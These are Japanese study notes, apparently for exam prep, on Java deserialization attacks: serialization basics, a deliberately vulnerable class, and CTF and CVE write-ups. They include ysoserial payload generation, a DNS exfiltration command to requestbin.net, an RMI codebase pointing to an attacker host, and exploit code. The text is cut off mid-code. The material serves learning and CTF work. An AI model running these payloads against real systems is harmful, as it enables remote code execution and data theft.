<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**

- [Serialize](#serialize)
  - [文字列のSerialize](#%E6%96%87%E5%AD%97%E5%88%97%E3%81%AEserialize)
  - [文字列のDeserialize](#%E6%96%87%E5%AD%97%E5%88%97%E3%81%AEdeserialize)
  - [脆弱なクラス](#%E8%84%86%E5%BC%B1%E3%81%AA%E3%82%AF%E3%83%A9%E3%82%B9)
  - [gadget](#gadget)
- [writeup](#writeup)
  - [Deserialize readObject() to RCE / craft UNC SMB-Server's path (CVE-2018-16364)](#deserialize-readobject-to-rce--craft-unc-smb-servers-path-cve-2018-16364)
  - [ysoserial CommonsBeanutils / reverse DNS Request with flag (Defiltrate)](#ysoserial-commonsbeanutils--reverse-dns-request-with-flag-defiltrate)
  - [RMI Registry / java.rmi.server.codebase / config vuln (PoliCTF 2017 LameRMI)](#rmi-registry--javarmiservercodebase--config-vuln-polictf-2017-lamermi)
  - [ysoserial Hibernate1 / encode reverse shell payload (OWASP WEBGOAT)](#ysoserial-hibernate1--encode-reverse-shell-payload-owasp-webgoat)
  - [ysoserial Spring / Runtime.exec() ReverseShell Payload with fixed-ysoserial (TAMUCTF2020 Too_Many_Credits)](#ysoserial-spring--runtimeexec-reverseshell-payload-with-fixed-ysoserial-tamuctf2020-too_many_credits)
  - [](#)
  - [](#-1)
- [DeserLab](#deserlab)
  - [setup](#setup)
  - [serializedデータの抽出](#serialized%E3%83%87%E3%83%BC%E3%82%BF%E3%81%AE%E6%8A%BD%E5%87%BA)
  - [endpointの特定](#endpoint%E3%81%AE%E7%89%B9%E5%AE%9A)
    - [SerializationDumper](#serializationdumper)
    - [jdeserialize](#jdeserialize)
  - [exploit (hardcoding)](#exploit-hardcoding)
  - [manually exploit](#manually-exploit)
- [参考](#%E5%8F%82%E8%80%83)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->

# Serialize
## 文字列のSerialize
以下でシリアライズする。   
```java
import java.io.*;

public class Serial
{
    public static void main(String[] args)
    {
        String name = "Nytro";
        String filename = "file.bin";

        try
        {
            // FileOutputStreamでファイルを操作する
            FileOutputStream file  = new FileOutputStream(filename);
            // ObjectOutputStreamでwriteObjectメソッドが使えるようになる。
            // FileOutputStreamを引数にとる。
            ObjectOutputStream out = new ObjectOutputStream(file);

            // Serialization of the "name" (String) object
            // Will be written to "file.bin"

            // writeObjectメソッドでシリアライズする。
            // この時、引数のオブジェクトはSerializableインターフェースを実装している必要がある
            out.writeObject(name);

            out.close();
            file.close();
        }
        catch(Exception e)
        {
            System.out.println("Exception: " + e.toString());
        }
    }
}
```
`ac ed`はシリアライズされたデータであることを示すマジックナンバー。   
`00 05`はシリアライズのプロトコルバージョン。   
```txt
root@kali:~/Documents/AWAE/javaDeserialization/ex1# javac Serial.java 
root@kali:~/Documents/AWAE/javaDeserialization/ex1# ls
Serial.class  Serial.java
root@kali:~/Documents/AWAE/javaDeserialization/ex1# java Serial 
root@kali:~/Documents/AWAE/javaDeserialization/ex1# ls
file.bin  Serial.class  Serial.java
root@kali:~/Documents/AWAE/javaDeserialization/ex1# file Serial.class 
Serial.class: compiled Java class data, version 55.0
root@kali:~/Documents/AWAE/javaDeserialization/ex1# cat file.bin | hexdump -C
00000000  ac ed 00 05 74 00 05 4e  79 74 72 6f              |....t..Nytro|
0000000c
root@kali:~/Documents/AWAE/javaDeserialization/ex1# 
```
## 文字列のDeserialize
```java
import java.io.*;

public class Program
{
    public static void main(String[] args)
    {
		String name;
		String filename = "file.bin";

		try
		{
			FileInputStream file  = new FileInputStream(filename);
            // ObjectInputStreamでデシリアライズするファイルを指定
            // これでreadObjectメソッドでデシリアライズできる
			ObjectInputStream out = new ObjectInputStream(file);

			// Serialization of the "name" (String) object
			// Will be written to "file.bin"

            // デシリアライズする。(String)でダウンキャストする
			name = (String)out.readObject();
			System.out.println(name);

			out.close();
			file.close();
		}
		catch(Exception e)
		{
		System.out.println("Exception: " + e.toString());
		}
	}
}
```
```txt
root@kali:~/Documents/AWAE/javaDeserialization/ex1# javac Program.java 
root@kali:~/Documents/AWAE/javaDeserialization/ex1# ls
file.bin  Program.class  Program.java  Serial.class  Serial.java
root@kali:~/Documents/AWAE/javaDeserialization/ex1# java Program 
Nytro
root@kali:~/Documents/AWAE/javaDeserialization/ex1# 
```

## 脆弱なクラス
**LogFile.java**   
```java
// Vulnerable class
import java.io.*;

// Serializableインターフェースを実装。これでLogFileクラスはシリアライズ可能となる
class LogFile implements Serializable
{
   public String filename;
   public String filecontent;

  // Function called during deserialization

  // readObjectメソッドを実装。これでLogFileクラスをreadObjectでデシリアライズする時はこっちのメソッドが実行される
  private void readObject(ObjectInputStream in)
  {
     System.out.println("readObject from LogFile");

     try
     {
        // デフォルトのデシリアライズを実行している場所！これでデシリアライズされたデータがオブジェクトの変数にもセットされた
        in.defaultReadObject();
        System.out.println("File name: " + filename + ", file content: \n" + filecontent);

        // Restore LogFile, write file content to file name
        // Logfileクラスのobj.filecontentデータをobj.filenameに保存する("Log.ser"にではない！)
        FileWriter file = new FileWriter(filename);
        BufferedWriter out = new BufferedWriter(file);

        System.out.println("Restoring log data to file...");
        out.write(filecontent);

        out.close();
        file.close();
     }
     catch (Exception e)
     {
         System.out.println("Exception: " + e.toString());
     }
   }
}
```
**Utils.java**   
```java
import java.io.*;

// ファイルにシリアライズ、ファイルからデシリアライズするメソッド
class Utils
{
    // Object型の引数を持つ。任意のオブジェクトのインスタンスを取れる
    public static void SerializeToFile(Object obj, String filename)
    {
        try
        {
            FileOutputStream file = new FileOutputStream(filename);
            ObjectOutputStream out = new ObjectOutputStream(file);

            // Serialization of the object to file

            System.out.println("Serializing " + obj.toString() + " to " + filename);
            // ここでシリアライズする！
            out.writeObject(obj);

            out.close();
            file.close();
        }
        catch(Exception e)
        {
            System.out.println("Exception: " + e.toString());
        }
    }

    public static Object DeserializeFromFile(String filename)
    {
        Object obj = new Object();

        try
        {
            FileInputStream file = new FileInputStream(filename);
            ObjectInputStream in = new ObjectInputStream(file);

            // Deserialization of the object to file

            System.out.println("Deserializing from " + filename);
            // ここで、LogFileクラスをデシリアライズする場合はLogFileクラスで実装したreadObjectが実行される
            obj = in.readObject();

            in.close();
            file.close();
        }
        catch(Exception e)
        {
            System.out.println("Exception: " + e.toString());
        }

        return obj;
    }
}
```
**Vuln.java**   
```java
import java.io.*;

public class Vuln
{
    public static void main(String[] args)
    {
		LogFile ob = new LogFile();
		ob.filename = "User_Nytro.log";
		ob.filecontent = "No actions logged";

		String file = "Log.ser"; // Log.serに、「User_Nytro.logにfilecontentのデータを保存する」というオブジェクトをシリアライズする、ってこと

		Utils.SerializeToFile(ob, file);  // LogFileクラスをシリアライズ
    		
		String name = "admin";
		String filename = "admin.ser";
		Utils.SerializeToFile(name,filename);  // Stringクラスをシリアライズ
		
		Utils.DeserializeFromFile(file);  // Logfileクラスのデータをデシリアライズ
		Utils.DeserializeFromFile(filename);  // Stringクラスのデータをデシリアライズ
	}
}
```
LogFileクラスのデシリアライズではLogFileクラスで実装したreadObjectメソッドが使用されているが、String型のデシリアライズでは標準のreadObjectが使われている。   
```txt
root@kali:~/Documents/AWAE/javaDeserialization/ex1# javac Vuln.java 
root@kali:~/Documents/AWAE/javaDeserialization/ex1# java Vuln 
Serializing LogFile@d46ca6 to Log.ser
Serializing admin to admin.ser
Deserializing from Log.ser
readObject from LogFile
File name: User_Nytro.log, file content: 
No actions logged
Restoring log data to file...
Deserializing from admin.ser
root@kali:~/Documents/AWAE/javaDeserialization/ex1#
root@kali:~/Documents/AWAE/javaDeserialization/ex1# cat Log.ser | hexdump -C
00000000  ac ed 00 05 73 72 00 07  4c 6f 67 46 69 6c 65 d7  |....sr..LogFile.|
00000010  60 3d d7 33 3e bc d1 02  00 02 4c 00 0b 66 69 6c  |`=.3>.....L..fil|
00000020  65 63 6f 6e 74 65 6e 74  74 00 12 4c 6a 61 76 61  |econtentt..Ljava|
00000030  2f 6c 61 6e 67 2f 53 74  72 69 6e 67 3b 4c 00 08  |/lang/String;L..|
00000040  66 69 6c 65 6e 61 6d 65  71 00 7e 00 01 78 70 74  |filenameq.~..xpt|
00000050  00 11 4e 6f 20 61 63 74  69 6f 6e 73 20 6c 6f 67  |..No actions log|
00000060  67 65 64 74 00 0e 55 73  65 72 5f 4e 79 74 72 6f  |gedt..User_Nytro|
00000070  2e 6c 6f 67                                       |.log|
00000074
root@kali:~/Documents/AWAE/javaDeserialization/ex1# 
```
ここから、シリアライズされたデータは`LogFileクラス`、`データ`を持ち、Javaのコードは含まないことがわかる。   
ここで攻撃者はデータを改竄することでRCEできるかも。この例だと、`obj.filename`の`User_Nytro.log`を`/etc/passwd`にして別のデータを書き込んだりWebshellを設置したりすればよい。   

## gadget
https://github.com/frohoff/ysoserial   
などにあるGadgetを使用して、シリアライズされたデータを作成すれば、ガジェットが動く環境にあれば、そのデータをデシリアライズさせることでRCEできる！   
どのガジェットが動くかわからないときは全部順に試していく必要があるらしい。   
   
例えば、以下のCommonsCollections5で動作するガジェットでシリアライズしたデータを逆シリアライズさえできればRCEできるということ！   
```txt
root@kali:~/Documents/AWAE/javaDeserialization/ex1# java -jar /opt/ysoserial-master-SNAPSHOT.jar CommonsCollections5 calc.exe > Exp.ser
root@kali:~/Documents/AWAE/javaDeserialization/ex1# cat Exp.ser | hexdump -C
00000000  ac ed 00 05 73 72 00 2e  6a 61 76 61 78 2e 6d 61  |....sr..javax.ma|
00000010  6e 61 67 65 6d 65 6e 74  2e 42 61 64 41 74 74 72  |nagement.BadAttr|
00000020  69 62 75 74 65 56 61 6c  75 65 45 78 70 45 78 63  |ibuteValueExpExc|
00000030  65 70 74 69 6f 6e d4 e7  da ab 63 2d 46 40 02 00  |eption....c-F@..|
00000040  01 4c 00 03 76 61 6c 74  00 12 4c 6a 61 76 61 2f  |.L..valt..Ljava/|
00000050  6c 61 6e 67 2f 4f 62 6a  65 63 74 3b 78 72 00 13  |lang/Object;xr..|
00000060  6a 61 76 61 2e 6c 61 6e  67 2e 45 78 63 65 70 74  |java.lang.Except|
00000070  69 6f 6e d0 fd 1f 3e 1a  3b 1c c4 02 00 00 78 72  |ion...>.;.....xr|
00000080  00 13 6a 61 76 61 2e 6c  61 6e 67 2e 54 68 72 6f  |..java.lang.Thro|
00000090  77 61 62 6c 65 d5 c6 35  27 39 77 b8 cb 03 00 04  |wable..5'9w.....|
000000a0  4c 00 05 63 61 75 73 65  74 00 15 4c 6a 61 76 61  |L..causet..Ljava|
000000b0  2f 6c 61 6e 67 2f 54 68  72 6f 77 61 62 6c 65 3b  |/lang/Throwable;|
000000c0  4c 00 0d 64 65 74 61 69  6c 4d 65 73 73 61 67 65  |L..detailMessage|
000000d0  74 00 12 4c 6a 61 76 61  2f 6c 61 6e 67 2f 53 74  |t..Ljava/lang/St|
000000e0  72 69 6e 67 3b 5b 00 0a  73 74 61 63 6b 54 72 61  |ring;[..stackTra|
000000f0  63 65 74 00 1e 5b 4c 6a  61 76 61 2f 6c 61 6e 67  |cet..[Ljava/lang|
00000100  2f 53 74 61 63 6b 54 72  61 63 65 45 6c 65 6d 65  |/StackTraceEleme|
00000110  6e 74 3b 4c 00 14 73 75  70 70 72 65 73 73 65 64  |nt;L..suppressed|
00000120  45 78 63 65 70 74 69 6f  6e 73 74 00 10 4c 6a 61  |Exceptionst..Lja|
00000130  76 61 2f 75 74 69 6c 2f  4c 69 73 74 3b 78 70 71  |va/util/List;xpq|
00000140  00 7e 00 08 70 75 72 00  1e 5b 4c 6a 61 76 61 2e  |.~..pur..[Ljava.|
00000150  6c 61 6e 67 2e 53 74 61  63 6b 54 72 61 63 65 45  |lang.StackTraceE|
00000160  6c 65 6d 65 6e 74 3b 02  46 2a 3c 3c fd 22 39 02  |lement;.F*<<."9.|
00000170  00 00 78 70 00 00 00 03  73 72 00 1b 6a 61 76 61  |..xp....sr..java|
00000180  2e 6c 61 6e 67 2e 53 74  61 63 6b 54 72 61 63 65  |.lang.StackTrace|
00000190  45 6c 65 6d 65 6e 74 61  09 c5 9a 26 36 dd 85 02  |Elementa...&6...|
000001a0  00 08 42 00 06 66 6f 72  6d 61 74 49 00 0a 6c 69  |..B..formatI..li|
000001b0  6e 65 4e 75 6d 62 65 72  4c 00 0f 63 6c 61 73 73  |neNumberL..class|
000001c0  4c 6f 61 64 65 72 4e 61  6d 65 71 00 7e 00 05 4c  |LoaderNameq.~..L|
000001d0  00 0e 64 65 63 6c 61 72  69 6e 67 43 6c 61 73 73  |..declaringClass|
000001e0  71 00 7e 00 05 4c 00 08  66 69 6c 65 4e 61 6d 65  |q.~..L..fileName|
000001f0  71 00 7e 00 05 4c 00 0a  6d 65 74 68 6f 64 4e 61  |q.~..L..methodNa|
00000200  6d 65 71 00 7e 00 05 4c  00 0a 6d 6f 64 75 6c 65  |meq.~..L..module|
00000210  4e 61 6d 65 71 00 7e 00  05 4c 00 0d 6d 6f 64 75  |Nameq.~..L..modu|
00000220  6c 65 56 65 72 73 69 6f  6e 71 00 7e 00 05 78 70  |leVersionq.~..xp|
00000230  01 00 00 00 51 74 00 03  61 70 70 74 00 26 79 73  |....Qt..appt.&ys|
00000240  6f 73 65 72 69 61 6c 2e  70 61 79 6c 6f 61 64 73  |oserial.payloads|
00000250  2e 43 6f 6d 6d 6f 6e 73  43 6f 6c 6c 65 63 74 69  |.CommonsCollecti|
00000260  6f 6e 73 35 74 00 18 43  6f 6d 6d 6f 6e 73 43 6f  |ons5t..CommonsCo|
00000270  6c 6c 65 63 74 69 6f 6e  73 35 2e 6a 61 76 61 74  |llections5.javat|
00000280  00 09 67 65 74 4f 62 6a  65 63 74 70 70 73 71 00  |..getObjectppsq.|
00000290  7e 00 0b 01 00 00 00 33  71 00 7e 00 0d 71 00 7e  |~......3q.~..q.~|
000002a0  00 0e 71 00 7e 00 0f 71  00 7e 00 10 70 70 73 71  |..q.~..q.~..ppsq|
000002b0  00 7e 00 0b 01 00 00 00  22 71 00 7e 00 0d 74 00  |.~......"q.~..t.|
000002c0  19 79 73 6f 73 65 72 69  61 6c 2e 47 65 6e 65 72  |.ysoserial.Gener|
000002d0  61 74 65 50 61 79 6c 6f  61 64 74 00 14 47 65 6e  |atePayloadt..Gen|
000002e0  65 72 61 74 65 50 61 79  6c 6f 61 64 2e 6a 61 76  |eratePayload.jav|
000002f0  61 74 00 04 6d 61 69 6e  70 70 73 72 00 1f 6a 61  |at..mainppsr..ja|
00000300  76 61 2e 75 74 69 6c 2e  43 6f 6c 6c 65 63 74 69  |va.util.Collecti|
00000310  6f 6e 73 24 45 6d 70 74  79 4c 69 73 74 7a b8 17  |ons$EmptyListz..|
00000320  b4 3c a7 9e de 02 00 00  78 70 78 73 72 00 34 6f  |.<......xpxsr.4o|
00000330  72 67 2e 61 70 61 63 68  65 2e 63 6f 6d 6d 6f 6e  |rg.apache.common|
00000340  73 2e 63 6f 6c 6c 65 63  74 69 6f 6e 73 2e 6b 65  |s.collections.ke|
00000350  79 76 61 6c 75 65 2e 54  69 65 64 4d 61 70 45 6e  |yvalue.TiedMapEn|
00000360  74 72 79 8a ad d2 9b 39  c1 1f db 02 00 02 4c 00  |try....9......L.|
00000370  03 6b 65 79 71 00 7e 00  01 4c 00 03 6d 61 70 74  |.keyq.~..L..mapt|
00000380  00 0f 4c 6a 61 76 61 2f  75 74 69 6c 2f 4d 61 70  |..Ljava/util/Map|
00000390  3b 78 70 74 00 03 66 6f  6f 73 72 00 2a 6f 72 67  |;xpt..foosr.*org|
000003a0  2e 61 70 61 63 68 65 2e  63 6f 6d 6d 6f 6e 73 2e  |.apache.commons.|
000003b0  63 6f 6c 6c 65 63 74 69  6f 6e 73 2e 6d 61 70 2e  |collections.map.|
000003c0  4c 61 7a 79 4d 61 70 6e  e5 94 82 9e 79 10 94 03  |LazyMapn....y...|
000003d0  00 01 4c 00 07 66 61 63  74 6f 72 79 74 00 2c 4c  |..L..factoryt.,L|
000003e0  6f 72 67 2f 61 70 61 63  68 65 2f 63 6f 6d 6d 6f  |org/apache/commo|
000003f0  6e 73 2f 63 6f 6c 6c 65  63 74 69 6f 6e 73 2f 54  |ns/collections/T|
00000400  72 61 6e 73 66 6f 72 6d  65 72 3b 78 70 73 72 00  |ransformer;xpsr.|
00000410  3a 6f 72 67 2e 61 70 61  63 68 65 2e 63 6f 6d 6d  |:org.apache.comm|
00000420  6f 6e 73 2e 63 6f 6c 6c  65 63 74 69 6f 6e 73 2e  |ons.collections.|
00000430  66 75 6e 63 74 6f 72 73  2e 43 68 61 69 6e 65 64  |functors.Chained|
00000440  54 72 61 6e 73 66 6f 72  6d 65 72 30 c7 97 ec 28  |Transformer0...(|
00000450  7a 97 04 02 00 01 5b 00  0d 69 54 72 61 6e 73 66  |z.....[..iTransf|
00000460  6f 72 6d 65 72 73 74 00  2d 5b 4c 6f 72 67 2f 61  |ormerst.-[Lorg/a|
00000470  70 61 63 68 65 2f 63 6f  6d 6d 6f 6e 73 2f 63 6f  |pache/commons/co|
00000480  6c 6c 65 63 74 69 6f 6e  73 2f 54 72 61 6e 73 66  |llections/Transf|
00000490  6f 72 6d 65 72 3b 78 70  75 72 00 2d 5b 4c 6f 72  |ormer;xpur.-[Lor|
000004a0  67 2e 61 70 61 63 68 65  2e 63 6f 6d 6d 6f 6e 73  |g.apache.commons|
000004b0  2e 63 6f 6c 6c 65 63 74  69 6f 6e 73 2e 54 72 61  |.collections.Tra|
000004c0  6e 73 66 6f 72 6d 65 72  3b bd 56 2a f1 d8 34 18  |nsformer;.V*..4.|
000004d0  99 02 00 00 78 70 00 00  00 05 73 72 00 3b 6f 72  |....xp....sr.;or|
000004e0  67 2e 61 70 61 63 68 65  2e 63 6f 6d 6d 6f 6e 73  |g.apache.commons|
000004f0  2e 63 6f 6c 6c 65 63 74  69 6f 6e 73 2e 66 75 6e  |.collections.fun|
00000500  63 74 6f 72 73 2e 43 6f  6e 73 74 61 6e 74 54 72  |ctors.ConstantTr|
00000510  61 6e 73 66 6f 72 6d 65  72 58 76 90 11 41 02 b1  |ansformerXv..A..|
00000520  94 02 00 01 4c 00 09 69  43 6f 6e 73 74 61 6e 74  |....L..iConstant|
00000530  71 00 7e 00 01 78 70 76  72 00 11 6a 61 76 61 2e  |q.~..xpvr..java.|
00000540  6c 61 6e 67 2e 52 75 6e  74 69 6d 65 00 00 00 00  |lang.Runtime....|
00000550  00 00 00 00 00 00 00 78  70 73 72 00 3a 6f 72 67  |.......xpsr.:org|
00000560  2e 61 70 61 63 68 65 2e  63 6f 6d 6d 6f 6e 73 2e  |.apache.commons.|
00000570  63 6f 6c 6c 65 63 74 69  6f 6e 73 2e 66 75 6e 63  |collections.func|
00000580  74 6f 72 73 2e 49 6e 76  6f 6b 65 72 54 72 61 6e  |tors.InvokerTran|
00000590  73 66 6f 72 6d 65 72 87  e8 ff 6b 7b 7c ce 38 02  |sformer...k{|.8.|
000005a0  00 03 5b 00 05 69 41 72  67 73 74 00 13 5b 4c 6a  |..[..iArgst..[Lj|
000005b0  61 76 61 2f 6c 61 6e 67  2f 4f 62 6a 65 63 74 3b  |ava/lang/Object;|
000005c0  4c 00 0b 69 4d 65 74 68  6f 64 4e 61 6d 65 71 00  |L..iMethodNameq.|
000005d0  7e 00 05 5b 00 0b 69 50  61 72 61 6d 54 79 70 65  |~..[..iParamType|
000005e0  73 74 00 12 5b 4c 6a 61  76 61 2f 6c 61 6e 67 2f  |st..[Ljava/lang/|
000005f0  43 6c 61 73 73 3b 78 70  75 72 00 13 5b 4c 6a 61  |Class;xpur..[Lja|
00000600  76 61 2e 6c 61 6e 67 2e  4f 62 6a 65 63 74 3b 90  |va.lang.Object;.|
00000610  ce 58 9f 10 73 29 6c 02  00 00 78 70 00 00 00 02  |.X..s)l...xp....|
00000620  74 00 0a 67 65 74 52 75  6e 74 69 6d 65 75 72 00  |t..getRuntimeur.|
00000630  12 5b 4c 6a 61 76 61 2e  6c 61 6e 67 2e 43 6c 61  |.[Ljava.lang.Cla|
00000640  73 73 3b ab 16 d7 ae cb  cd 5a 99 02 00 00 78 70  |ss;......Z....xp|
00000650  00 00 00 00 74 00 09 67  65 74 4d 65 74 68 6f 64  |....t..getMethod|
00000660  75 71 00 7e 00 2f 00 00  00 02 76 72 00 10 6a 61  |uq.~./....vr..ja|
00000670  76 61 2e 6c 61 6e 67 2e  53 74 72 69 6e 67 a0 f0  |va.lang.String..|
00000680  a4 38 7a 3b b3 42 02 00  00 78 70 76 71 00 7e 00  |.8z;.B...xpvq.~.|
00000690  2f 73 71 00 7e 00 28 75  71 00 7e 00 2c 00 00 00  |/sq.~.(uq.~.,...|
000006a0  02 70 75 71 00 7e 00 2c  00 00 00 00 74 00 06 69  |.puq.~.,....t..i|
000006b0  6e 76 6f 6b 65 75 71 00  7e 00 2f 00 00 00 02 76  |nvokeuq.~./....v|
000006c0  72 00 10 6a 61 76 61 2e  6c 61 6e 67 2e 4f 62 6a  |r..java.lang.Obj|
000006d0  65 63 74 00 00 00 00 00  00 00 00 00 00 00 78 70  |ect...........xp|
000006e0  76 71 00 7e 00 2c 73 71  00 7e 00 28 75 72 00 13  |vq.~.,sq.~.(ur..|
000006f0  5b 4c 6a 61 76 61 2e 6c  61 6e 67 2e 53 74 72 69  |[Ljava.lang.Stri|
00000700  6e 67 3b ad d2 56 e7 e9  1d 7b 47 02 00 00 78 70  |ng;..V...{G...xp|
00000710  00 00 00 01 74 00 08 63  61 6c 63 2e 65 78 65 74  |....t..calc.exet|
00000720  00 04 65 78 65 63 75 71  00 7e 00 2f 00 00 00 01  |..execuq.~./....|
00000730  71 00 7e 00 34 73 71 00  7e 00 24 73 72 00 11 6a  |q.~.4sq.~.$sr..j|
00000740  61 76 61 2e 6c 61 6e 67  2e 49 6e 74 65 67 65 72  |ava.lang.Integer|
00000750  12 e2 a0 a4 f7 81 87 38  02 00 01 49 00 05 76 61  |.......8...I..va|
00000760  6c 75 65 78 72 00 10 6a  61 76 61 2e 6c 61 6e 67  |luexr..java.lang|
00000770  2e 4e 75 6d 62 65 72 86  ac 95 1d 0b 94 e0 8b 02  |.Number.........|
00000780  00 00 78 70 00 00 00 01  73 72 00 11 6a 61 76 61  |..xp....sr..java|
00000790  2e 75 74 69 6c 2e 48 61  73 68 4d 61 70 05 07 da  |.util.HashMap...|
000007a0  c1 c3 16 60 d1 03 00 02  46 00 0a 6c 6f 61 64 46  |...`....F..loadF|
000007b0  61 63 74 6f 72 49 00 09  74 68 72 65 73 68 6f 6c  |actorI..threshol|
000007c0  64 78 70 3f 40 00 00 00  00 00 00 77 08 00 00 00  |dxp?@......w....|
000007d0  10 00 00 00 00 78 78                              |.....xx|
000007d7
root@kali:~/Documents/AWAE/javaDeserialization/ex1# 
```
# writeup
## Deserialize readObject() to RCE / craft UNC SMB-Server's path (CVE-2018-16364)
https://blog.jamesotten.com/post/applications-manager-rce/  
Windows上ではUNCパス`\\ip\path\to\file\test.txt`(実際にローカルにあるわけではないがSMBとかでローカルにあるようにして扱えるパス？)を作成することができるので、ここにPayload仕込んでおけばアクセスしたときにそのPayloadを読み込める。  
Zoho ManageEngine Applications Manager before build 13740の`CustomFieldsFeedServlet`クラス(?)の`customFieldObject`フィールドに`/servlet/CustomFieldsFeedServlet?customFieldObject=`みたいにして値をセットできるらしくて、そこにパスを書いておけばそのパスを`readObject`でデシリアライズしようとする脆弱性らしい。  
攻撃者SMBサーバーにysoserialで作成したCommonsCollections1のガジェットを用意しておいて、SMBへのパスをフィールドにセットすればそのガジェットを読み込んでRCE！  

多分JDGuiとかでjarファイルをデコンパイルして発見したのかな？？？  
## ysoserial CommonsBeanutils / reverse DNS Request with flag (Defiltrate)
https://r3billions.com/writeup-defiltrate-part1/  
- **entrypoint**  
よくわからんけど、たぶんリクエストを見ると`VIEW`というパラメータにBase64エンコードされたデータがPOSTされてて、`rO0AB`で始まってるからJavaのシリアライズされたデータだとわかる。  
これをSerializationDumperで解析するといかのように、いくつかのログイン関係の値らしい。  
```txt
values
    m_b64Payload
    (object)
        TC_STRING - 0x74
        newHandle 0x00 7e 00 03
        Length - 0 - 0x00 00
        Value -  - 0x
    m_login
    (object)
        TC_STRING - 0x74
        newHandle 0x00 7e 00 04
        Length - 5 - 0x00 05
        Value - admin - 0x61646d696e
    m_password
    (object)
        TC_STRING - 0x74
        newHandle 0x00 7e 00 05
        Length - 21 - 0x00 15
        Value - I love pink ponies <3 - 0x49206c6f76652070696e6b20706f6e696573203c33
    m_sessionID
    (object)
        TC_STRING - 0x74
        newHandle 0x00 7e 00 06
        Length - 2 - 0x00 02
        Value - 42 - 0x3432
```
`m_sessionID`の値を`42`から`0`,`1`に変えてみるような以下のシリアライズされたデータを作成しても何も変化がなかったらしい。  
```java
import java.io.*;
import java.util.*;

class WebSession implements Serializable {
    String m_b64Payload;
    String m_login;
    String m_password;
    String m_sessionID;
}

public class NewClass {

   public static void main(String [] args) {
      WebSession e = new WebSession();
      e.m_b64Payload = "eW91dHUuYmUvZFF3NHc5V2dYY1E=";
      e.m_login = "admin";
      e.m_password = "I love pink ponies <3";
      e.m_sessionID = "1";

      try {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream( baos );
        oos.writeObject( e );
        oos.close();
        System.out.println(Base64.getEncoder().encodeToString(baos.toByteArray()));
      } catch (IOException i) {
         i.printStackTrace();
      }
   }
}
```
なので、ysoserialを今度は使うらしい。`CommonsBeanutils1`を使えばいけたらしいけどこれは多分いろいろ試して頑張ってるのか？  
ファイアーウォールが外部へのリクエストをDNS以外はじくっぽいので、digコマンドで攻撃者サーバーにDNSリクエストを送信させるらしい。  
```txt
java -jar ysoserial.jar CommonsBeanutils1 'dig rce.ef8d2b0eafff5eb0e48f.d.requestbin.net' | base64 -w0
```
そのあとはなんやかんやしてdigコマンドで発生させるDNSリクエストにFlagの値を付与して送信させてるけどよくわからん…  
- **payload**  
```txt
java -jar ysoserial.jar CommonsBeanutils1 'dig rce.ef8d2b0eafff5eb0e48f.d.requestbin.net' | base64 -w0
```

## RMI Registry / java.rmi.server.codebase / config vuln (PoliCTF 2017 LameRMI)
https://github.com/PoliCTF/sources2017/blob/master/pwn-lamermi/writeup.md  
- **entrypoint**  
1999ポートにJavaのRMI Registryが、8000ポートにWebサーバーが動いているらしい。  
問題文に「Javaの設定が脆弱な状態になっている」的なヒントがあるらしい。  
JavaのRMI Registryは設定が`userCodebaseOnly=false`となっており、クラスがローカルで解決できない場合(存在しないクラスをよびだそうとした場合)`java.rmi.server.codebase=`に設定されているWebサーバーにクラスを探しに行くらしい。  
Javaを実行するRMIとRMI Registryは別。  
そして、その探しにいくWebサーバーはクライアントがレジストリに対して指定できるらしい！！！(レジストリに対して「`java.rmi.server.codebase=http://malicious`にアクセスしてクラスを取得してね」ってクライアントが設定できるらしい？？)  
https://docs.oracle.com/javase/jp/1.5.0/guide/rmi/codebase.html  
```txt
java \
 -Djava.security.policy=security.policy \
 -Djava.rmi.server.useCodebaseOnly=false \
 -Djava.rmi.server.hostname=lamermi.chall.polictf.it \
 -jar lamermi-1.0-SNAPSHOT.jar
```
また、以下のように全エントリに対して実行権限を付与しているのも良くないらしい？  
上記で挿入したヤバいクラスのヤバいメソッドを制限なしで実行できるからかな。  
```txt
grant {
    permission java.security.AllPermission;
};
```
また、http serverには以下の`AverageService`インタフェースだけが書かれたソースファイルが置かれているらしい。  
```java
public interface AverageService extends Remote {
    Double average(List<Integer> integerList) throws RemoteException;
}
```
実際、以下のようにしてレジストリにアクセスすることで、`AverageService`というサービスが使えることがわかる。  
```java
Registry registry = LocateRegistry.getRegistry("lamermi.chall.polictf.it", 1099);
System.out.println("registry found");

String[] ports = registry.list();
for (String port: ports) {
    System.out.println(port);
}
// prints "AverageService"
```
以下のようにして使うこともできるらしい。  
```java
AverageService averageService = (AverageService) registry.lookup("AverageService");
ArrayList<Integer> myIntList = new ArrayList<Integer>();
myIntList.add(1);
myIntList.add(2);
myIntList.add(3);
System.out.println(averageService.average(myIntList)); // prints "2.0"
```
どうやらRMIはRMI Registryにあるクラスを取得した後に一度シリアライズするらしく、それをまたデシリアライズしてからチェックするらしい。つまり、チェックする前にデシリアライズしてしまう！  
したがって、`Serializerable`インターフェースを実装した`Exploit`クラスを作成してそこに任意の処理を書いた`readObject`を定義しておけば、Exploitクラスをデシリアライズするときにそっちの`readObject`でデシリアライズするようになって任意の処理を実行できる！  
  
- **payload**  
以下のコマンドを攻撃者側で実行してコンパイル済みのMain.classを実行すればいいっぽい？  
このように`-D`で指定すると、この設定がRMI Registryに反映されるっぽい？？  
```txt
java -Djava.rmi.server.codebase=http://attacker.webserver/folder Main
```
RMI Registryを見つけて接続してExploitクラスのインスタンスをRegistryに登録する。  
```java
public static void main(String args[]) {

  AverageService service = null;
  Registry reg1 = null;
  Remote p = new Payload();

  String host = args[0];
  int port = Integer.parseInt(args[1]);

  System.out.println("Searching registry at "+host+":"+port);

  try {
      reg1 = LocateRegistry.getRegistry(host,port);
  } catch (RemoteException e) {
      System.out.println("No registry   found!\nAborting...");
      e.printStackTrace();
      return;
  } finally {
      System.out.println("Registry found!");
  }

  System.out.println("Starting exploit...");
  try {
      reg1.bind("new service", p);
  } catch (RemoteException | AlreadyBoundException e) {
      System.out.println(e.getMessage());
  }
}
```
デシリアライズ時に`readObject`によって`explot()`が実行される。  
なんか例外を発生させてその例外の中でFlagを表示してるっぽい？  
```java
public class Exploit implements Remote, Serializable {
  public void exploit() throws IOException {
      /*
       Cat flag is not java enough
      */
      BufferedReader br = new BufferedReader(new FileReader("flag"));
      try {
          StringBuilder sb = new StringBuilder();
